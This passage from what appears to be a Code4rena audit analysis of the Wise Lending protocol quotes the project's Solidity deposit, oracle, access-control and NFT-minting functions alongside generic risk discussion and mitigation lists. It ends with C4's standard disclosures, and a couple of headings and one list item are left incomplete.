    validToken(_underlyingAsset)
    returns (uint256)
{
    _safeTransferFrom(
        _underlyingAsset,
        msg.sender,
        address(this),
        _amount
    );

    uint256 lendingShares = _wrapDepositExactAmount(
        _nftId,
        _underlyingAsset,
        _amount
    );

    emit IsDepositAave(
        _nftId,
        block.timestamp
    );

    return lendingShares;
}
```

The complexity arises from the need to coordinate and ensure the correctness of these interactions across multiple contracts.

To mitigate the risks associated with complexity and intercontract dependencies, it is essential to:

- Clearly define and document the expected behavior and assumptions for each contract and their interactions.
- Implement robust error handling and input validation to handle unexpected scenarios and prevent unintended behavior.
- Use modular and decoupled design patterns to minimize dependencies and make the codebase more maintainable.
- Regularly review and update the contracts to address any changes in the external contracts or protocols being integrated.

**Oracle Dependence and Manipulation**

The `WiseLending` heavily relies on the `OracleHub` contract for accurate price feed data to calculate collateral values, borrow limits, and perform other critical functions. The `OracleHub` contract acts as a central source of truth for asset prices, and the protocol assumes that the price data provided by the Oracle is reliable and up-to-date.

> If the price feed data provided by the `OracleHub` is manipulated or becomes unreliable, it can have severe consequences for WiseLending.

Incorrect price data can lead to the following issues:
1. **Undercollateralized Positions:** If the Oracle reports inflated asset prices, users may be able to borrow more than they should, leading to undercollateralized positions. In the event of a price drop, the protocol may not have sufficient collateral to cover the outstanding loans, resulting in potential losses.
2. **Liquidation Failures:** Manipulated Oracle prices can prevent the timely liquidation of undercollateralized positions. If the Oracle reports inflated prices, the protocol may fail to detect positions that should be liquidated, allowing them to remain open and exposing the protocol to further risk.
3. **Exploitable Price Discrepancies:** If an attacker can manipulate the Oracle prices, they may be able to exploit price discrepancies between the Oracle and actual market prices. This could lead to profitable arbitrage opportunities at the expense of the protocol and its users.

Retrieving the latest price data from the Oracle: [function `latestResolver`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/WiseOracleHub.sol#L69-L83).

```solidity
function latestResolver(
    address _tokenAddress
)
    public
    view
    returns (uint256)
{
    if (chainLinkIsDead(_tokenAddress) == true) {
        revert OracleIsDead();
    }

    return _validateAnswer(
        _tokenAddress
    );
}
```

Calculating the collateral value in ETH using Oracle prices: [function `getTokensInETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/WiseOracleHub.sol#L143-L168).

```solidity
function getTokensInETH(
    address _tokenAddress,
    uint256 _tokenAmount
)
    public
    view
    returns (uint256)
{
    if (_tokenAddress == WETH_ADDRESS) {
        return _tokenAmount;
    }

    uint8 tokenDecimals = _tokenDecimals[
        _tokenAddress
    ];

    return _decimalsETH < tokenDecimals
        ? _tokenAmount
            * latestResolver(_tokenAddress)
            / 10 ** decimals(_tokenAddress)
            / 10 ** (tokenDecimals - _decimalsETH)
        : _tokenAmount
            * 10 ** (_decimalsETH - tokenDecimals)
            * latestResolver(_tokenAddress)
            / 10 ** decimals(_tokenAddress);
}
```

Usage of OracleHub in the `WiseSecurity` contract for calculating borrow limits: [function `safeLimitPosition`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L641-L689).

```solidity
function safeLimitPosition(
    uint256 _nftId
)
    external
    view
    returns (uint256)
{
    uint256 len = WISE_LENDING.getPositionLendingTokenLength(
        _nftId
    );

    if (len == 0) {
        return 0;
    }

    uint256 i;
    address token;
    uint256 buffer;

    while (i < len) {

        token = WISE_LENDING.getPositionLendingTokenByIndex(
            _nftId,
            i
        );

        unchecked {
            ++i;
        }

        if (checkHeartbeat(token) == false) {
            continue;
        }

        if (wasBlacklisted[token] == true) {
            continue;
        }

        buffer += WISE_LENDING.lendingPoolData(token).collateralFactor
            * getFullCollateralETH(
                _nftId,
                token
            ) / PRECISION_FACTOR_E18;
    }

    return buffer
        * BORROW_PERCENTAGE_CAP
        / PRECISION_FACTOR_E18;
}
```

These code snippets demonstrate how the `OracleHub` contract is used to retrieve price data and calculate collateral values in ETH. The `latestResolver` function is called to get the latest price for a given token, and the `getTokensInETH` function uses the Oracle price to convert token amounts to their ETH equivalent.

The `safeLimitPosition` function in the `WiseSecurity` contract relies on the Oracle prices to calculate the borrow limit for a given position. It retrieves the collateral tokens associated with the position and calculates their collateral value using the `getFullCollateralETH` function, which internally uses the `OracleHub`'s price data.

To mitigate the risks associated with Oracle dependence and manipulation, the following measures can be implemented:
1. **Decentralized Oracle Networks:** Instead of relying on a single Oracle source, consider using decentralized Oracle networks like Chainlink, which aggregate price data from multiple reliable sources. This reduces the risk of a single point of failure and makes it more difficult for an attacker to manipulate prices.
2. **Oracle Price Deviation Checks:** Implement checks to detect significant deviations in Oracle prices compared to historical data or external reference prices. If the deviation exceeds a certain threshold, the protocol can trigger circuit breakers or emergency measures to prevent exploits.
3. **Delayed Price Updates:** Introduce a delay between the time when Oracle prices are updated and when they are used by the protocol. This provides a window for detecting and mitigating potential price manipulations before they can be exploited.
4. **Redundant Price Sources:** Use multiple independent price sources and compare their data to identify inconsistencies or anomalies. If there is a significant discrepancy between the sources, the protocol can halt operations or use the most conservative price to err on the side of caution.
5. **Robust Liquidation Mechanisms:** Ensure that the liquidation mechanisms are robust and can handle scenarios where Oracle prices may be manipulated. Implement safeguards such as using conservative price estimates or requiring a minimum liquidation threshold to prevent unnecessary liquidations.

**Liquidity and Solvency Risks**

`WiseLending` integrates with Aave to optimize capital efficiency by depositing unutilized funds into the Aave lending pool. This integration allows the protocol to earn additional yield on idle funds. However, the reliance on Aave for liquidity management introduces liquidity and solvency risks.

> These risks lies in the assumption that funds deposited into Aave will always be available for withdrawal when needed. If there are issues with Aave, such as a security breach, smart contract vulnerability, or a significant decline in the value of the deposited assets, it could impact the liquidity available to the `WiseLending`.

Furthermore, if a large number of users simultaneously decide to withdraw their funds from `WiseLending`, it could lead to a liquidity crunch. The protocol may not have sufficient liquid assets available to meet all withdrawal requests promptly, especially if the funds are locked up in the Aave lending pool.

Insufficient liquidity can have severe consequences for `WiseLending` and its users:

1. **Withdrawal Failures:** If the protocol lacks the necessary liquidity to process user withdrawals, users may be unable to access their funds when needed. This can lead to a loss of user confidence and reputational damage to the protocol.
2. **Run on the Protocol:** If users perceive that the protocol is facing liquidity issues, it could trigger a panic-driven run on the protocol. Users may rush to withdraw their funds, exacerbating the liquidity problem and potentially leading to a collapse of the protocol.
3. **Solvency Risks:** Prolonged liquidity issues can evolve into solvency risks. If the protocol is unable to meet its financial obligations or if the value of its assets declines significantly, it may become insolvent. This could result in substantial losses for users and the protocol itself.
4. **Contagion Effects:** Liquidity and solvency issues in WiseLending can have spillover effects on other interconnected protocols or the wider DeFi ecosystem. If the protocol holds a significant amount of assets or has dependencies on other protocols, its liquidity problems can trigger a chain reaction of liquidity events.

Depositing funds into Aave: [function `depositExactAmount`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L122-L151).

```solidity
function depositExactAmount(
    uint256 _nftId,
    address _underlyingAsset,
    uint256 _amount
)
    public
    nonReentrant
    validToken(_underlyingAsset)
    returns (uint256)
{
    _safeTransferFrom(
        _underlyingAsset,
        msg.sender,
        address(this),
        _amount
    );

    uint256 lendingShares = _wrapDepositExactAmount(
        _nftId,
        _underlyingAsset,
        _amount
    );

    emit IsDepositAave(
        _nftId,
        block.timestamp
    );

    return lendingShares;
}
```

Withdrawing funds from Aave: [function `withdrawExactAmount`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L202-L232).

```solidity
function withdrawExactAmount(
    uint256 _nftId,
    address _underlyingAsset,
    uint256 _withdrawAmount
)
    external
    nonReentrant
    validToken(_underlyingAsset)
    returns (uint256)
{
    _checkOwner(
        _nftId
    );

    (
        uint256 withdrawnShares
        ,
    ) = _wrapWithdrawExactAmount(
        _nftId,
        _underlyingAsset,
        msg.sender,
        _withdrawAmount
    );

    emit IsWithdrawAave(
        _nftId,
        block.timestamp
    );

    return withdrawnShares;
}
```

The deposit and withdrawal functions in the `AaveHub` contract. The `depositExactAmount` function transfers the specified amount of the underlying asset from the user to the `AaveHub` contract and then calls the internal `_wrapDepositExactAmount` function to deposit the funds into Aave. The `withdrawExactAmount` function allows users to withdraw a specific amount of the underlying asset from Aave.

While the integration with Aave provides capital efficiency benefits, it also introduces liquidity risks. If Aave experiences issues or if there is a sudden surge in withdrawal requests, `WiseLending` may struggle to meet the liquidity demands.

To mitigate these risks, WiseLending can consider the following measures:
1. **Diversification of Liquidity Sources:** Instead of relying solely on Aave for liquidity management, the protocol can explore integrating with multiple lending protocols or liquidity providers. This diversification can help spread the risk and provide alternative sources of liquidity.
2. **Liquidity Reserves:** Maintain a portion of the protocol's funds as liquid reserves that can be quickly accessed to meet unexpected withdrawal demands. These reserves should be held in highly liquid assets and regularly adjusted based on the protocol's liquidity needs.
3. **Liquidity Stress Testing:** Conduct regular stress tests to assess the protocol's ability to handle various liquidity scenarios, including extreme withdrawal events. This can help identify potential vulnerabilities and guide the development of contingency plans.
4. **Liquidity Monitoring and Risk Management:** Implement robust liquidity monitoring and risk management systems to proactively identify and address liquidity risks. This includes monitoring key metrics such as the protocol's liquidity ratios, Aave's liquidity, and market conditions.
5. **Clear Communication and Transparency:** Provide clear communication to users about the protocol's liquidity management practices and the risks associated with the Aave integration. Transparency about the protocol's financial health and risk management strategies can help maintain user confidence.
6. **Emergency Mechanisms:** Develop and test emergency mechanisms that can be triggered in the event of severe liquidity issues. These mechanisms may include temporary withdrawal limitations, circuit breakers, or the ability to quickly liquidate assets to meet withdrawal demands.

By implementing these measures and continuously monitoring and managing liquidity risks, `WiseLending` can mitigate the potential impact of liquidity and solvency issues arising from the Aave integration. 

**Access Control and Permissions**

`WiseLending` utilizes various access control mechanisms and permissions to restrict certain critical functions to authorized entities. These access controls are implemented using modifiers such as `onlyMaster` and roles like `securityWorker`. The purpose of these access controls is to ensure that sensitive operations can only be performed by trusted parties.

However, the security of the protocol heavily relies on the integrity of these access control mechanisms. If the private keys associated with the `master` account or the `securityWorker` role are compromised, or if there are vulnerabilities in the implementation of the access control logic, it could lead to unauthorized access and potential exploits.

Compromised access control can have severe consequences for `WiseLending` and its users:
1. **Unauthorized Parameter Manipulation:** If an attacker gains access to the `master` account or the `securityWorker` role, they could manipulate critical protocol parameters such as interest rates, collateral factors, or liquidation thresholds. This could disrupt the economic incentives of the protocol and lead to financial losses for users.
2. **Theft of Funds:** With unauthorized access, an attacker could potentially drain funds from the protocol by exploiting functions that allow the transfer or withdrawal of assets. This could result in significant financial losses for the protocol and its users.
3. **Disruption of Protocol Functionality:** An attacker with access to privileged roles could disrupt the normal functioning of the protocol by modifying or disabling critical components. This could lead to a loss of user confidence and damage the protocol's reputation.
4. **Bypass of Security Checks:** If the access control mechanisms are bypassed, an attacker could circumvent important security checks and validations implemented in the protocol. This could allow them to perform malicious actions or exploit vulnerabilities that would otherwise be prevented.

`onlyMaster` modifier in the `WiseSecurity` contract

`securityWorker` role in the `WiseSecurity` contract: [function `setSecurityWorker`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L995-L1003) and [function `securityShutdown`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L1011-L1026).

```solidity
function setSecurityWorker(
    address _entitiy,
    bool _state
)
    external
    onlyMaster
{
    securityWorker[_entitiy] = _state;
}

function securityShutdown()
    external
{
    if (securityWorker[msg.sender] == false) {
        revert NotAllowedEntity();
    }

    _setPoolState(
        true
    );

    emit SecurityShutdown(
        msg.sender,
        block.timestamp
    );
}
```

Access control in the `FeeManager` contract

To mitigate the risks associated with access control and permissions, WiseLending can implement the following measures:

1. **Secure Key Management:** Ensure that the private keys associated with the `master` account and other privileged roles are securely stored and managed. Use hardware wallets or multi-signature schemes to reduce the risk of key compromise.
2. **Principle of Least Privilege:** Follow the principle of least privilege and grant access permissions only to the minimum necessary entities. Regularly review and audit the access control configurations to ensure that permissions are appropriately restricted.
3. **Timely Access Revocation:** Implement mechanisms to promptly revoke access for compromised or unauthorized accounts. Have an incident response plan in place to quickly mitigate the impact of unauthorized access.
4. **Multi-Signature and Timelocks:** Consider implementing multi-signature requirements for critical operations, such as modifying protocol parameters or transferring significant funds. Use timelocks to introduce a delay between the initiation and execution of sensitive actions, allowing time for detection and intervention.
system. Engage reputable third-party auditors to identify and address any vulnerabilities or weaknesses.
6. **Robust Monitoring and Alerting:** Implement comprehensive monitoring and alerting systems to detect and notify relevant parties of any suspicious activities or unauthorized access attempts. Prompt detection can help minimize the impact of potential exploits.
7. **Decentralized Governance:** Consider transitioning to a decentralized governance model where protocol upgrades and parameter changes are decided through community voting or a decentralized autonomous organization (DAO). This can help distribute control and reduce the reliance on a single central authority.

**Position NFT Security**

`WiseLending` uses the `PositionNFTs` contract to represent a user's lending position. Each user must have a unique position NFT to interact with the protocol, and the ownership of this NFT determines the user's ability to perform actions such as depositing, withdrawing, borrowing, and repaying funds.

The security of user positions heavily relies on the integrity and security of the `PositionNFTs` contract. If there are vulnerabilities in the NFT contract or if the NFTs are stolen or compromised, it could lead to unauthorized access to user positions and potential financial losses.

Compromised or stolen position NFTs can have severe consequences for users and the protocol as a whole:
1. **Unauthorized Position Manipulation:** If an attacker gains control of a user's position NFT, they could perform unauthorized actions on behalf of the user. This includes depositing or withdrawing funds, borrowing additional assets, or modifying the position's collateral or debt.
2. **Forced Liquidations:** An attacker with access to a position NFT could intentionally manipulate the position to trigger a liquidation. By reducing the collateral or increasing the debt, the attacker could force the liquidation of the position, potentially at unfavorable terms for the original user.
3. **Theft of Funds:** If the position NFT is compromised, an attacker could withdraw funds from the user's position, leading to the theft of the user's assets. This could result in significant financial losses for the affected users.
4. **Loss of User Confidence:** If position NFTs are frequently compromised or if there are known vulnerabilities in the NFT contract, it could erode user confidence in the protocol. Users may hesitate to entrust their funds to the protocol, damaging its reputation and adoption.

Minting of position NFTs: [function `mintPosition`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PositionNFTs.sol#L142-L149), [function `mintPositionForUser`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PositionNFTs.sol#L174-L191) and [function `_mintPositionForUser`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PositionNFTs.sol#L193-L220).

```solidity
function mintPosition()
    external
    returns (uint256)
{
    return _mintPositionForUser(
        msg.sender
    );
}

function mintPositionForUser(
    address _user
)
    external
    returns (uint256)
{
    if (isApprovedForAll(
            _user,
            msg.sender
        ) == false
    ) {
        revert NotPermitted();
    }

    return _mintPositionForUser(
        _user
    );
}

function _mintPositionForUser(
    address _user
)
    internal
    returns (uint256)
{
    uint256 nftId = reserved[
        _user
    ];

    if (nftId > 0) {
        delete reserved[
            _user
        ];

        totalReserved--;

    } else {
        nftId = getNextExpectedId();
    }

    _mint(
        _user,
        nftId
    );

    return nftId;
}
```

Checking ownership of position NFTs: [function `isOwner`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PositionNFTs.sol#L222-L243).

```solidity
function isOwner(
    uint256 _nftId,
    address _owner
)
    external
    view
    returns (bool)
{
    if (_nftId == FEE_MANAGER_NFT) {
        return feeManager == _owner;
    }

    if (reserved[_owner] == _nftId) {
        return true;
    }

    if (ownerOf(_nftId) == _owner) {
        return true;
    }

    return false;
}
```

To mitigate the risks associated with position NFT security, `WiseLending` can consider the following measures:
1. **Secure NFT Contract:** Ensure that the PositionNFTs contract follows best practices for secure contract development. This includes proper access control, input validation, and protection against common vulnerabilities such as reentrancy attacks and integer overflows.
2. **Thorough Testing and Auditing:** Conduct extensive testing and security audits of the PositionNFTs contract to identify and address any vulnerabilities or weaknesses. Engage reputable third-party auditors to perform a comprehensive security assessment of the NFT contract.
3. **Secure NFT Storage:** Educate users about the importance of securely storing their position NFTs. Encourage the use of hardware wallets or secure non-custodial wallets to minimize the risk of NFT theft or compromise.
4. **Robust Ownership Verification:** Implement strict ownership verification mechanisms within the protocol to ensure that only the rightful owner of a position NFT can perform actions on the corresponding position. This can include additional checks beyond the standard ERC721 ownership functions.
5. **Emergency Pause and Recovery:** Implement emergency pause and recovery mechanisms that allow the protocol administrators to quickly halt NFT transfers or freeze compromised positions in case of a security incident. This can help prevent further damage and provide time for investigation and resolution.
6. **User Education and Awareness:** Educate users about the risks associated with position NFTs and provide clear guidelines on securing their NFTs. Encourage users to regularly monitor their positions and promptly report any suspicious activities.
7. **Insurance and Compensation:** Consider implementing insurance mechanisms or a compensation fund to protect users against potential losses due to NFT compromise or protocol vulnerabilities. This can help mitigate the financial impact on affected users and maintain trust in the protocol.

## Recommendations and Best Practices

1. Implement a robust governance framework with decentralized decision-making and multi-signature controls.
2. Conduct regular security audits and code reviews to identify and address potential vulnerabilities.
3. Establish a bug bounty program to encourage the community to report any issues or vulnerabilities.
4. Implement comprehensive risk management strategies, including stress testing, circuit breakers, and emergency response plans.
5. Provide clear and transparent documentation on the protocol's mechanisms, risks, and governance processes.
6. Foster a strong community and encourage active participation in the protocol's development and governance.

## Conclusion

The Wise Lending protocol offers a comprehensive lending and borrowing solution with various features and integrations. However, the complexity of the system and its dependence on external protocols introduce several risks and challenges. By addressing the identified issues, implementing best practices, and continuously monitoring and improving the protocol, Wise Lending can enhance its security, reliability, and long-term sustainability in the DeFi ecosystem.

### Time spent

41 hours

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
